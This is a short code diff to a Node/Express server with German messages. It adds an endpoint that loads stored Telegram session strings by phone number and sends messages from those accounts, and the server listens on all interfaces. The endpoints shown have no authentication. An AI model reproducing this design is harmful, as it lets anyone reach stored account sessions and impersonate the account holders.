@@ -68,4 +68,18 @@ app.get('/get-sessions', async (req, res) => {
     } catch (err) { res.status(500).json({ error: 'DB Fehler' }); }
 });
 
+// Aktion: Nachricht senden
+app.post('/send-message', async (req, res) => {
+    const { phone, target, message } = req.body;
+    const sessionDoc = await Session.findOne({ phone });
+    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });
 
+    try {
+        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
+        await client.connect();
+        await client.sendMessage(target, { message });
+        res.json({ success: true });
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
